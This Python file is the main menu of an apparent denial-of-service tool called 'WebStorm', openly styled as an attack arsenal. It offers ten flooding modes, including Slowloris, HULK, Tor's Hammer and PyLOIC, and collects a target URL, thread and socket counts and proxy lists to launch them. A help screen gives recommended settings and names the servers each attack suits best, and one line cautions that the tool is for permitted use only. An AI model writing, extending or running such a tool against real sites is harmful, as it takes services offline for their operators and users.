import os
import sys
from core.colors import *
from core.animations import Animation

class MainMenu:
    def run(self):
        while True:
            self._show_menu()
            choice = input(f"  {GREEN}WebStorm{RED}>{RESET} ").strip()
            
            handlers = {
                '01': self.http_flood,
                '02': self.slowloris,
                '03': self.rudy,
                '04': self.hulk,
                '05': self.goldeneye,
                '06': self.torhammer,
                '07': self.xerxes,
                '08': self.pyloic,
                '09': self.ssl_flood,
                '10': self.multi_vector,
                '11': self.target_analyzer,
                '12': self.proxy_scanner,
                '13': self.settings,
                '14': self.help_menu,
            }
            
            if choice == '00':
                Animation.typewriter("Shutting down WebStorm...", 0.05, RED)
                sys.exit(0)
            elif choice in handlers:
                handlers[choice]()
            else:
                print(f"  {error('Invalid selection!')}")
                input(f"  {DIM}Press Enter...{RESET}")
    
    def _show_menu(self):
        os.system('clear')
        from core.banner import Banner
        Banner.show()
        
        print(f"""{CYAN}
    ╔════════════════════════════════════════════════════════╗
    ║          {WHITE}⚡ WEBSTORM ATTACK ARSENAL ⚡{CYAN}              ║
    ╠════════════════════════════════════════════════════════╣
    ║                                                        ║
    ║  {YELLOW}━━━ HTTP LAYER 7 ATTACKS ━━━{CYAN}                        ║
    ║  {YELLOW}[01]{RESET} 🌊 HTTP Flood        {DIM}(Fast HTTP request flood){CYAN}   ║
    ║  {YELLOW}[02]{RESET} 🐌 Slowloris         {DIM}(Slow header attack){CYAN}        ║
    ║  {YELLOW}[03]{RESET} 💀 R-U-Dead-Yet      {DIM}(Slow POST body){CYAN}            ║
    ║  {YELLOW}[04]{RESET} 💪 HULK              {DIM}(HTTP Unbearable Load){CYAN}      ║
    ║  {YELLOW}[05]{RESET} 👁  GoldenEye         {DIM}(KeepAlive exhaust){CYAN}         ║
    ║                                                        ║
    ║  {YELLOW}━━━ ANONYMOUS ATTACKS ━━━{CYAN}                           ║
    ║  {YELLOW}[06]{RESET} 🧅 Tor's Hammer      {DIM}(Anonymous via Tor){CYAN}         ║
    ║  {YELLOW}[07]{RESET} ⚔️  Xerxes            {DIM}(Powerful DoS){CYAN}              ║
    ║  {YELLOW}[08]{RESET} 🎯 PyLOIC            {DIM}(Low Orbit Ion Cannon){CYAN}      ║
    ║                                                        ║
    ║  {YELLOW}━━━ ADVANCED VECTORS ━━━{CYAN}                            ║
    ║  {YELLOW}[09]{RESET} 🔐 SSL Flood         {DIM}(SSL handshake drain){CYAN}       ║
    ║  {YELLOW}[10]{RESET} 🎯 Multi-Vector      {DIM}(Combined attacks){CYAN}          ║
    ║                                                        ║
    ║  {YELLOW}━━━ UTILITIES ━━━{CYAN}                                    ║
    ║  {YELLOW}[11]{RESET} 🔍 Target Analyzer   {DIM}(Deep target scan){CYAN}          ║
    ║  {YELLOW}[12]{RESET} 🌐 Proxy Scanner     {DIM}(Test proxy list){CYAN}           ║
    ║  {YELLOW}[13]{RESET} ⚙️  Settings          {DIM}(Configuration){CYAN}             ║
    ║  {YELLOW}[14]{RESET} ℹ️  Help & About      {DIM}(Documentation){CYAN}             ║
    ║                                                        ║
    ║  {RED}[00]{RESET} 🚪 Exit WebStorm                                 {CYAN}║
    ║                                                        ║
    ╚════════════════════════════════════════════════════════╝{RESET}
        """)
    
    def _get_config(self, attack_name):
        """Get common attack config"""
        from core.banner import Banner
        Banner.attack_banner(attack_name)
        
        print(f"\n  {CYAN}━━━ Configure {attack_name.upper()} Attack ━━━{RESET}\n")
        url = input(f"  {GREEN}🎯 Target URL      :{RESET} ").strip()
        if not url:
            return None
        
        threads = input(f"  {GREEN}🧵 Threads [500]   :{RESET} ").strip() or "500"
        sockets = input(f"  {GREEN}🔌 Sockets [1000]  :{RESET} ").strip() or "1000"
        duration = input(f"  {GREEN}⏱  Duration [0=∞]  :{RESET} ").strip() or "0"
        proxy = input(f"  {GREEN}🌐 Proxy [none]    :{RESET} ").strip() or None
        turbo = input(f"  {GREEN}⚡ Turbo mode [n]  :{RESET} ").strip().lower() == 'y'
        
        return {
            'url': url,
            'threads': int(threads),
            'sockets': int(sockets),
            'duration': int(duration),
            'proxy_file': proxy,
            'turbo': turbo
        }
    
    def _launch(self, attack_type, config):
        from modules.attacks.engine import AttackEngine
        Animation.loading(f"Preparing {attack_type} attack", 2)
        Animation.countdown(3)
        Animation.firing_animation()
        
        engine = AttackEngine(
            url=config['url'],
            attack_type=attack_type,
            threads=config['threads'],
            sockets=config['sockets'],
            duration=config['duration'],
            proxy_file=config.get('proxy_file'),
            turbo=config.get('turbo', False)
        )
        engine.launch()
        input(f"\n  {DIM}Press Enter to return to menu...{RESET}")
    
    def http_flood(self):
        config = self._get_config('http')
        if config: self._launch('http', config)
    
    def slowloris(self):
        config = self._get_config('slowloris')
        if config: self._launch('slowloris', config)
    
    def rudy(self):
        config = self._get_config('rudy')
        if config: self._launch('rudy', config)
    
    def hulk(self):
        config = self._get_config('hulk')
        if config: self._launch('hulk', config)
    
    def goldeneye(self):
        config = self._get_config('goldeneye')
        if config: self._launch('goldeneye', config)
    
    def torhammer(self):
        config = self._get_config('torhammer')
        if config: self._launch('torhammer', config)
    
    def xerxes(self):
        config = self._get_config('xerxes')
        if config: self._launch('xerxes', config)
    
    def pyloic(self):
        config = self._get_config('pyloic')
        if config: self._launch('pyloic', config)
    
    def ssl_flood(self):
        config = self._get_config('ssl')
        if config: self._launch('ssl', config)
    
    def multi_vector(self):
        config = self._get_config('multi')
        if config: self._launch('multi', config)
    
    def target_analyzer(self):
        from core.target_analyzer import TargetAnalyzer
        print(f"\n  {CYAN}━━━ Deep Target Analysis ━━━{RESET}\n")
        url = input(f"  {GREEN}🎯 Target URL:{RESET} ").strip()
        if url:
            analyzer = TargetAnalyzer(url)
            analyzer.deep_scan()
        input(f"\n  {DIM}Press Enter...{RESET}")
    
    def proxy_scanner(self):
        print(f"\n  {CYAN}━━━ Proxy Scanner ━━━{RESET}\n")
        proxy_file = input(f"  {GREEN}📁 Proxy file path:{RESET} ").strip()
        if proxy_file and os.path.exists(proxy_file):
            from core.proxy_manager import ProxyManager
            pm = ProxyManager(proxy_file)
            print(f"  {info(f'Testing {pm.count()} proxies...')}")
            working = pm.test_all()
            print(f"  {success(f'Working proxies: {working}')}")
        input(f"\n  {DIM}Press Enter...{RESET}")
    
    def settings(self):
        print(f"\n  {CYAN}━━━ Settings ━━━{RESET}\n")
        print(f"  {info('Edit config.json to modify settings')}")
        input(f"\n  {DIM}Press Enter...{RESET}")
    
    def help_menu(self):
        os.system('clear')
        print(f"""{CYAN}
    ╔══════════════════════════════════════════════════════╗
    ║              WEBSTORM HELP & DOCS                    ║
    ╠══════════════════════════════════════════════════════╣{RESET}
    
    {YELLOW}🌊 HTTP Flood:{RESET}
       Massive HTTP GET/POST request flood
       Best for: General web servers
       Threads: 500-2000
    
    {YELLOW}🐌 Slowloris:{RESET}
       Sends partial HTTP headers slowly
       Best for: Apache servers
       Sockets: 500-1000
    
    {YELLOW}💀 RUDY (R-U-Dead-Yet):{RESET}
       Slow POST body transmission
       Best for: Web apps with forms
       Threads: 100-500
    
    {YELLOW}💪 HULK:{RESET}
       Unique random requests, bypasses cache
       Best for: Static websites
       Threads: 500-1500
    
    {YELLOW}👁 GoldenEye:{RESET}
       Persistent KeepAlive connection attack
       Best for: HTTP/1.1 servers
       Workers: 50-100
    
    {YELLOW}🧅 Tor's Hammer:{RESET}
       Slow POST via Tor network (anonymous)
       Best for: Anonymous testing
       Requires: Tor installed
    
    {YELLOW}⚔️  Xerxes:{RESET}
       Powerful single-source DoS
       Best for: Small-medium servers
       Threads: 200-1000
    
    {YELLOW}🎯 PyLOIC:{RESET}
       Python Low Orbit Ion Cannon
       Best for: TCP/UDP flood testing
       Threads: 100-500
    
    {YELLOW}🔐 SSL Flood:{RESET}
       SSL/TLS handshake resource exhaustion
       Best for: HTTPS servers
       Sockets: 500-1000
    
    {YELLOW}🎯 Multi-Vector:{RESET}
       Combines multiple attack types
       Best for: Comprehensive testing
       Uses: All above techniques
    
    {RED}⚠️  WARNING: Use only on your own servers or with 
        explicit written permission!{RESET}
        """)
        input(f"\n  {DIM}Press Enter...{RESET}")
